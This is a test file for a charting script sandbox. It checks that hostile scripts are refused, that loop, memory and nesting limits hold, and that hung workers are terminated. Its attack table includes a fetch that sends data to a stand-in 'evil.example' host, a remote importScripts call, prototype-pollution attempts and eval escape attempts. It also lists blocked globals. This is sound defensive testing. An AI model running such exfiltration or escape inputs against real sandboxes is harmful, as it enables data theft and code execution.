// The sandbox: hostile scripts are refused or terminated with the right diagnostic;
// the worker global is locked down; the runner terminates a worker that hangs.

import { describe, expect, it } from "vitest";
import { StudyEngine, type WorkerLike } from "@alphacharts/indicators";
import { compile, DEFAULT_LIMITS, ScriptRunner } from "../src/index.js";
import { BLOCKED_GLOBALS, lockdown, serveScripts, withBridge, type FromWorker } from "../src/sandbox.js";
import { DATA, ok } from "./support.js";

const msgs = (src: string) => { const r = compile(src); return r.ok ? [] : r.diagnostics.map((d) => d.message); };

describe("hostile source is refused at compile time", () => {
  const ATTACKS: [string, RegExp][] = [
    ['fetch("https://evil.example/?" + close)\nplot(close)', /unknown function "fetch"/],
    ["x = XMLHttpRequest\nplot(close)", /unknown name "XMLHttpRequest"/],
    ["x = WebSocket\nplot(close)", /unknown name "WebSocket"/],
    ["importScripts(\"https://evil.example/x.js\")\nplot(close)", /unknown function "importScripts"/],
    ["x = EventSource\nplot(close)", /unknown name "EventSource"/],
    ["x = indexedDB\nplot(close)", /unknown name "indexedDB"/],
    ["x = caches\nplot(close)", /unknown name "caches"/],
    ["x = document\nplot(close)", /unknown name "document"/],
    ["x = window.location\nplot(close)", /unknown name "window"|only namespace/],
    ["x = self\nplot(close)", /unknown name "self"/],
    ["x = globalThis\nplot(close)", /unknown name "globalThis"/],
    ['eval("1")\nplot(close)', /'eval' is not part of the language/],
    ["x = Function\nplot(close)", /unknown name "Function"/],
    ["x = close.constructor\nplot(close)", /constructor. is a reserved name/],
    ["x = ta.constructor\nplot(close)", /constructor. is a reserved name/],
    ["x = math.__proto__\nplot(close)", /__proto__' is a reserved name/],
    ["__proto__ = 1\nplot(close)", /reserved name/],
    ["x = prototype\nplot(close)", /reserved name/],
    ["Object.prototype.polluted = 1\nplot(close)", /unknown name "Object"|reserved/],
    ["x = Date.now()\nplot(close)", /unknown name "Date"|unknown function "Date.now"/],
    ["x = Math.random()\nplot(close)", /unknown name "Math"|unknown function "Math.random"/],
    ["x = math.random()\nplot(close)", /unknown function "math.random"/],
    ["x = import\nplot(close)", /'import' is not supported/],
    ["x = `${1}`\nplot(close)", /unexpected character/],
    ["x = 1; fetch(2)\nplot(close)", /unexpected character/],
    ["x = \\u0066etch\nplot(close)", /unexpected character/],
  ];
  for (const [src, re] of ATTACKS) {
    it(JSON.stringify(src), () => {
      const m = msgs(src);
      expect(m.length).toBeGreaterThan(0);
      expect(m.join("\n")).toMatch(re);
    });
  }
  it("compiling and running attacks leaves the prototypes untouched", () => {
    const before = [Object.keys(Object.prototype), Object.getOwnPropertyNames(Array.prototype).length, Object.keys(Function.prototype)];
    for (const [src] of ATTACKS) compile(src);
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
    expect([Object.keys(Object.prototype), Object.getOwnPropertyNames(Array.prototype).length, Object.keys(Function.prototype)]).toEqual(before);
  });
});

describe("resource limits", () => {
  const nested = "float a = 0.0\nfor i = 1 to 3000\n    for j = 1 to 3000\n        a += 1\nplot(a)";
  it("a nested loop that exceeds the step budget is stopped with the budget diagnostic", () => {
    const r = compile(nested, { ...DEFAULT_LIMITS, maxSteps: 100_000 });
    if (!r.ok) throw new Error("should compile");
    const e = new StudyEngine(r.study);
    try { e.load(DATA); throw new Error("not stopped"); } catch (err) {
      expect(String(err)).toMatch(/execution budget exceeded: more than 100000 loop steps in one bar/);
      expect((err as { kind: string }).kind).toBe("budget");
      expect((err as { span: { from: number } }).span.from).toBeGreaterThanOrEqual(0);
    }
  });
  it("the step budget is per bar: a long loop passes on 60,000 bars as on 100", () => {
    const e = new StudyEngine(ok("float a = 0.0\nfor j = 0 to 399\n    a += 1\nplot(a)").study);
    const n = 60_000;
    const big = { time: new Float64Array(n).map((_, i) => i + 1), open: new Float64Array(n).fill(1), high: new Float64Array(n).fill(1), low: new Float64Array(n).fill(1), close: new Float64Array(n).fill(1), volume: new Float64Array(n).fill(1) };
    e.load(big);
    expect(e.column(0)[n - 1]).toBe(400);
  });
  it("with the default budget the same script is stopped too, and quickly", () => {
    const e = new StudyEngine(ok(nested.replace("3000", "9999").replace("3000", "9999")).study);
    const t = performance.now();
    expect(() => e.load(DATA)).toThrow(/execution budget exceeded/);
    expect(performance.now() - t).toBeLessThan(10_000);
  });
  it("a constant loop beyond the iteration limit is refused before running", () => {
    expect(msgs("for i = 1 to 20000\n    x = 1\nplot(close)")[0]).toMatch(/runs 20000 times; the limit is 10000/);
  });
  it("huge periods, offsets and arrays-in-spirit are refused", () => {
    expect(msgs("plot(ta.sma(close, 1000000000))")[0]).toMatch(/between 1 and 5000/);
    expect(msgs("plot(close[1000000000])")[0]).toMatch(/offset must be between 0 and 1000000/);
    expect(msgs("x = [1, 2, 3]\nplot(close)")[0]).toMatch(/array values are only allowed/);
    expect(msgs("x = input.string(\"a\", options=[\"a\"])\ny = x[0]\nplot(close)").length).toBeGreaterThan(0);
  });
  it("source length is capped", () => {
    const r = compile("plot(close)\n".repeat(30_000));
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.diagnostics[0]!.message).toMatch(/the limit is 200000/);
  });
  it("deep nesting is refused, not recursed into", () => {
    const r = compile(`plot(${"(".repeat(5000)}close${")".repeat(5000)})`);
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.diagnostics.map((d) => d.message).join()).toMatch(/nested too deeply/);
    const r2 = compile(`plot(${"-".repeat(5000)}close)`);
    expect(r2.ok).toBe(false);
  });
  it("too many columns is a build error naming the limit", () => {
    const body = Array.from({ length: 40 }, (_, i) => `a${i} = ta.sma(close, ${i + 2})`).join("\n");
    const r = compile(`${body}\nplot(a0)`, { ...DEFAULT_LIMITS, maxColumns: 20 });
    if (!r.ok) throw new Error("should compile");
    expect(() => new StudyEngine(r.study)).toThrow(/columns; the limit is 20/);
  });
});

describe("serveScripts (the worker's handler)", () => {
  function harness() {
    const out: FromWorker[] = [];
    const handle = serveScripts((m) => out.push(m));
    const next = async (pred: (m: FromWorker) => boolean) => {
      for (let k = 0; k < 400; k++) { const m = out.find(pred); if (m) return m; await new Promise((r) => setTimeout(r, 5)); }
      throw new Error("no reply");
    };
    return { handle, out, next };
  }
  const bars = () => ({ time: DATA.time.slice(), open: DATA.open.slice(), high: DATA.high.slice(), low: DATA.low.slice(), close: DATA.close.slice(), volume: DATA.volume.slice() });

  it("runs a batch, then follows ticks and revisions", async () => {
    const { handle, next } = harness();
    handle({ type: "run", id: 1, sid: 1, source: "plot(ta.sma(close, 5))", params: {}, bars: bars() });
    const res = (await next((m) => m.type === "result")) as Extract<FromWorker, { type: "result" }>;
    expect(res.n).toBe(DATA.close.length);
    const n = res.n;
    const t = DATA.time[n - 1]!;
    handle({ type: "bar", sid: 1, index: n - 1, bar: { time: t, open: 1, high: 3, low: 1, close: 2, volume: 1 } });
    const v1 = (await next((m) => m.type === "values")) as Extract<FromWorker, { type: "values" }>;
    expect(v1.index).toBe(n - 1);
    const want = (DATA.close[n - 5]! + DATA.close[n - 4]! + DATA.close[n - 3]! + DATA.close[n - 2]! + 2) / 5;
    expect(v1.values[0]).toBeCloseTo(want, 9);
    handle({ type: "bar", sid: 1, index: n, bar: { time: t + 60_000, open: 1, high: 3, low: 1, close: 4, volume: 1 } });
    await next((m) => m.type === "values" && m.index === n);
  });
  it("a bar for an instance the worker does not hold is an error reply, not silence", async () => {
    const { handle, next } = harness();
    handle({ type: "bar", sid: 77, index: 0, bar: { time: 1, open: 1, high: 1, low: 1, close: 1, volume: 1 } });
    expect(((await next((m) => m.type === "tick-error")) as Extract<FromWorker, { type: "tick-error" }>).error.message).toMatch(/no computed state in this worker/);
  });
  it("an instance disposed while its batch runs keeps no engine", async () => {
    const { handle, next, out } = harness();
    handle({ type: "run", id: 1, sid: 5, source: "plot(close)", params: {}, bars: bars() });
    handle({ type: "dispose", sid: 5 });
    await next((m) => m.type === "result");
    handle({ type: "bar", sid: 5, index: 0, bar: { time: 1, open: 1, high: 1, low: 1, close: 1, volume: 1 } });
    await next((m) => m.type === "tick-error");
    expect(out.filter((m) => m.type === "values")).toEqual([]);
  });
  it("a bar that is out of step is reported, not applied", async () => {
    const { handle, next } = harness();
    handle({ type: "run", id: 1, sid: 1, source: "plot(close)", params: {}, bars: bars() });
    await next((m) => m.type === "result");
    handle({ type: "bar", sid: 1, index: 9999, bar: { time: 9e15, open: 1, high: 1, low: 1, close: 1, volume: 1 } });
    const e = (await next((m) => m.type === "tick-error")) as Extract<FromWorker, { type: "tick-error" }>;
    expect(e.error.message).toMatch(/out of sync/);
  });
  it("memory and bar caps are enforced before the run", async () => {
    const a = harness();
    a.handle({ type: "run", id: 1, sid: 1, source: "plot(ta.sma(close, 5))", params: {}, bars: bars(), limits: { maxBytes: 1000 } });
    const e = (await a.next((m) => m.type === "error")) as Extract<FromWorker, { type: "error" }>;
    expect(e.error.message).toMatch(/MiB \(3 x \d+ columns x \d+ bars x 8\); the limit/);
    expect(e.error.kind).toBe("budget");
    const b = harness();
    b.handle({ type: "run", id: 2, sid: 1, source: "plot(close)", params: {}, bars: bars(), limits: { maxBars: 10 } });
    expect(((await b.next((m) => m.type === "error")) as Extract<FromWorker, { type: "error" }>).error.message).toMatch(/exceed the limit of 10/);
  });
  it("a script that does not compile is an error reply with the diagnostics", async () => {
    const { handle, next } = harness();
    handle({ type: "run", id: 1, sid: 1, source: "plot(fetch)", params: {}, bars: bars() });
    expect(((await next((m) => m.type === "error")) as Extract<FromWorker, { type: "error" }>).error.message).toMatch(/1:6: unknown name "fetch"/);
  });
  it("a runtime failure is an error reply with its range", async () => {
    const { handle, next } = harness();
    handle({ type: "run", id: 1, sid: 1, source: "plot(close[bar_index - 3])", params: {}, bars: bars() });
    const e = (await next((m) => m.type === "error")) as Extract<FromWorker, { type: "error" }>;
    expect(e.error.kind).toBe("runtime");
    expect(e.error.from).toBe(5);
  });
  it("a cancel before the first chunk is honoured", async () => {
    const { handle, next } = harness();
    handle({ type: "cancel", id: 3 });
    handle({ type: "run", id: 3, sid: 1, source: "plot(close)", params: {}, bars: bars() });
    // cancel arrives before the run: the run completes (cancel only applies to a run in flight)
    await next((m) => m.type === "result" || m.type === "cancelled");
  });
});

describe("main-thread mirror", () => {
  it("has exactly the columns of the worker's graph, and computes nothing", () => {
    for (const src of ["plot(ta.sma(close, 5))", "[m, s, h] = ta.macd(close, 12, 26, 9)\nplot(m)\nplot(h)", "var n = 0\nn += 1\nplot(n)", "plot(ta.rsi(close, 14))\nhline(50)"]) {
      const study = ok(src).study;
      const real = new StudyEngine(withBridge(study));
      const mirror = new StudyEngine(withBridge(study, undefined, true));
      expect(mirror.graph.cols.length).toBe(real.graph.cols.length);
      mirror.load(DATA);
      for (const c of mirror.outputs) expect(Array.from(c.v.subarray(0, DATA.close.length)).every((v) => v !== v)).toBe(true);
    }
  });
  it("the bridge fires once per appended or revised bar, not on a batch", () => {
    const calls: number[] = [];
    const e = new StudyEngine(withBridge(ok("plot(close)").study, (i) => calls.push(i), true));
    e.load(DATA);
    expect(calls).toEqual([]);
    const last = DATA.close.length - 1;
    const b = { time: DATA.time[last]! + 1, open: 1, high: 2, low: 1, close: 2, volume: 1 };
    e.push(b);
    e.reviseLast({ ...b, close: 3 });
    expect(calls).toEqual([last + 1, last + 1]);
  });
});

class FakeWorker implements WorkerLike {
  terminated = false;
  sent: unknown[] = [];
  private handlers: ((e: { data: unknown }) => void)[] = [];
  private onSend: ((m: unknown, reply: (m: unknown) => void) => void) | null;
  constructor(onSend: ((m: unknown, reply: (m: unknown) => void) => void) | null) { this.onSend = onSend; }
  postMessage(m: unknown): void { this.sent.push(m); this.onSend?.(m, (r) => this.handlers.forEach((h) => h({ data: r }))); }
  addEventListener(type: string, fn: (e: never) => void): void { if (type === "message") this.handlers.push(fn as never); }
  terminate(): void { this.terminated = true; }
}

describe("ScriptRunner", () => {
  const bars = () => ({ time: DATA.time.slice(), close: DATA.close.slice() });
  function runnerWith(onSend: ConstructorParameters<typeof FakeWorker>[0], limits = {}) {
    const workers: FakeWorker[] = [];
    const runner = new ScriptRunner(() => { const w = new FakeWorker(onSend); workers.push(w); return w; }, limits);
    return { runner, workers };
  }
  it("a worker that never answers is terminated at the budget, reported, and replaced", async () => {
    const { runner, workers } = runnerWith(null, { batchMs: 30 });
    const def = withBridge(ok("plot(close)").study);
    runner.attach(def, "plot(close)", { values() {}, error() {} });
    const t = performance.now();
    await expect(runner.run(def, { studyId: def.id, params: {}, bars: bars() }).promise).rejects.toThrow(/did not finish within 30 ms and was terminated/);
    expect(performance.now() - t).toBeLessThan(2000);
    expect(workers[0]!.terminated).toBe(true);
    // the next request gets a fresh worker
    const p = runner.run(def, { studyId: def.id, params: {}, bars: bars() });
    expect(workers.length).toBe(2);
    p.promise.catch(() => {});
    runner.dispose();
  });
  it("a tick that is not answered terminates the worker and reports to the listener", async () => {
    const { runner, workers } = runnerWith(null, { tickMs: 20 });
    const def = withBridge(ok("plot(close)").study);
    const errors: string[] = [];
    const sid = runner.attach(def, "plot(close)", { values() {}, error: (e) => errors.push(e.message) });
    runner.sendBar(sid, 0, { time: 1, open: 1, high: 1, low: 1, close: 1, volume: 1 });
    await new Promise((r) => setTimeout(r, 80));
    expect(errors).toEqual(["a tick took longer than 20 ms; the script was terminated"]);
    expect(workers[0]!.terminated).toBe(true);
  });
  it("after a termination every instance is told once and stops sending bars until it is run again", async () => {
    const { runner, workers } = runnerWith(null, { tickMs: 20 });
    const a = withBridge(ok("plot(close)").study), b = withBridge(ok("plot(open)").study);
    const ea: string[] = [], eb: string[] = [];
    const sa = runner.attach(a, "plot(close)", { values() {}, error: (e) => ea.push(e.message) });
    runner.attach(b, "plot(open)", { values() {}, error: (e) => eb.push(e.message) });
    runner.sendBar(sa, 0, { time: 1, open: 1, high: 1, low: 1, close: 1, volume: 1 });
    await new Promise((r) => setTimeout(r, 60));
    expect(ea.length).toBe(1);
    expect(eb.length).toBe(1);
    const posted = workers[0]!.sent.length;
    runner.sendBar(sa, 1, { time: 2, open: 1, high: 1, low: 1, close: 1, volume: 1 });
    await new Promise((r) => setTimeout(r, 60));
    expect(workers.length).toBe(1); // no new worker was started for a dead instance
    expect(workers[0]!.sent.length).toBe(posted);
    expect(ea.length).toBe(1);
  });
  it("maps a worker error to a ScriptError with its range", async () => {
    const { runner } = runnerWith((m, reply) => reply({ type: "error", id: (m as { id: number }).id, error: { message: "boom", from: 3, to: 5, kind: "runtime" } }));
    const def = withBridge(ok("plot(close)").study);
    runner.attach(def, "plot(close)", { values() {}, error() {} });
    await expect(runner.run(def, { studyId: def.id, params: {}, bars: bars() }).promise).rejects.toMatchObject({ message: "boom", span: { from: 3, to: 5 }, kind: "runtime" });
  });
  it("refuses a definition that is not a script", () => {
    const { runner } = runnerWith(null);
    expect(runner.canRun(ok("plot(close)").study)).toBe(false);
  });
});

describe("lockdown", () => {
  it("shadows every blocked capability, read-only and non-configurable", () => {
    const scope: Record<string, unknown> = { fetch: () => 1, XMLHttpRequest: class {}, WebSocket: class {}, importScripts: () => 1, EventSource: class {}, indexedDB: {}, caches: {}, eval: () => 1, Math: { random: () => 1 }, Date: { now: () => 1 } };
    const rep = lockdown(scope);
    expect(rep.missing).toEqual([]);
    for (const name of BLOCKED_GLOBALS) {
      expect(scope[name]).toBeUndefined();
      expect(() => { "use strict"; (scope as { [k: string]: unknown })[name] = 1; }).toThrow();
      expect(Object.getOwnPropertyDescriptor(scope, name)).toMatchObject({ configurable: false, writable: false });
    }
    expect(() => (scope.eval as (s: string) => void)("1")).toThrow(/not available to scripts/);
    expect(() => (scope.Math as { random(): void }).random()).toThrow(/not available/);
    expect(() => (scope.Date as { now(): void }).now()).toThrow(/not available/);
  });
  it("is idempotent and reports what it could not shadow", () => {
    const scope = {};
    Object.defineProperty(scope, "fetch", { value: 1, configurable: false });
    const rep = lockdown(scope);
    expect(rep.missing).toContain("fetch");
    expect(() => lockdown(scope)).not.toThrow();
  });
});
